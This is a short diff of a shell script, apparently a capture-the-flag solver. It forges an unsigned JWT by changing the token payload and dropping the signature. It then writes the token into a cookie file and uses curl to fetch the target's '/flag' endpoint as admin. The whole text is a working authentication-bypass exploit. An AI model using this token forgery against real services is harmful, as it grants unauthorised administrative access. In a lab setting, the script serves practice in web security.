@@ -48,10 +48,10 @@ ENCODED_HEADER=$(echo "$HEADER" | base64 | tr -d '\n' | tr -d '=' | sed 's/+/-/g
 ENCODED_PAYLOAD=$(echo "$MODIFIED_PAYLOAD" | base64 | tr -d '\n' | tr -d '=' | sed 's/+/-/g; s/\//_/g')
 UNSIGNED_TOKEN="$ENCODED_HEADER.$ENCODED_PAYLOAD"
 echo "--> Token modified : $UNSIGNED_TOKEN"
-sed -i "s/\(jwt-token\s*\)\S\+/\1$UNSIGNED_TOKEN/" "/work/8-cookies.txt"
+awk -v new_jwt="$UNSIGNED_TOKEN" '{if ($6 == "jwt-token") $7 = new_jwt} 1' "/work/8-cookies.txt" > tmp && mv tmp "/work/8-cookies-admin.txt"
 
 
 # Gather secret data
 echo "2.4 - GATHER ADMIN DATA"
-curl -s -X GET "http://$target_ip:8089" -L -b /work/8-cookies.txt -o /work/8-admin.html
+curl -s -X GET "http://$target_ip:8089/flag" -L -b /work/8-cookies-admin.txt -o /work/8-admin.html
 
